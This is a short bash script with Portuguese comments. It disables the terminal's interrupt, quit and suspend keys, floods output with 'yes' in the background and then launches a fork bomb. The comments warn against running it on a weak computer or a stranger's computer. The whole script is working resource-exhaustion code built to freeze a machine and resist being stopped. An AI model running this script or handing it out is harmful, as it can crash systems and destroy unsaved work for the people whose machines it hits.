#!/usr/bin/bash

# Se vc está lendo isso,
# não execute esse comando em um pc fraco
# ou pc de um desconhecido

ARQ=$1

if [[ -z "$*" ]]; then
  echo -e "Adicione permissão de execução primeiro:\nchmod +x $0"
else
  stty intr ""
  stty quit ""
  stty susp undef
  yes "$1" &
  :(){
    :|: &
  };:
fi
#
